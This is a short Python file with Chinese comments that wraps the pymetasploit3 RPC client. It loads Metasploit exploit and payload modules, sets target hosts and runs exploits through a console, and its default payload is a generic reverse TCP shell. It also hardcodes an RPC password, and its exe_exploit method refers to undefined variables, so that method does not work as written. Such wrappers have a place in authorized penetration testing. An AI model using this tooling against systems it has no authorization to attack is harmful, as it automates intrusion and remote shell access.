#攻击实例化的类
from pymetasploit3.msfrpc import MsfRpcClient

class msfmodule(object):
    def __init__(self):
        self.name = ''
        self.exploit = ''
        self.payload = 'generic/shell_reverse_tcp' #默认payload配置
        self.RHOSTS = ""
        self.URI = ""
        self.console = ''
        self.exploit_module = ''
        self.payload_module = ''
        self.client = MsfRpcClient('mycroft', port = 55552)

    def load(self , name , exploit , payload = 'generic/shell_reverse_tcp'):
        self.name = name
        self.exploit = exploit
        self.payload = payload
        self.exploit_module = self.client.modules.use('exploit', self.exploit)
        self.payload_module = self.client.modules.use('payload', self.payload)

    def set_target(self, RHOSTS , URI):
        self.RHOSTS = RHOSTS
        self.URI = URI
    
    def cre_console(self):
        try:
            console_id = self.client.consoles.console().cid
            if console_id != '':
                self.console = self.client.consoles.console(console_id)
            else:
                print("console创建失败")
        except Exception as e:
            print(e)

    def show_option(self):
        self.console.write('show options')
        print(self.console.read()['data'])

    def exe_exploit(self):
        try:
            self.console.run_module_with_output(exploit, payload)
        except Exception as e:
            print(e)

    def cmd(self, command):
        self.console.write(command)
        return self.console.read()
    

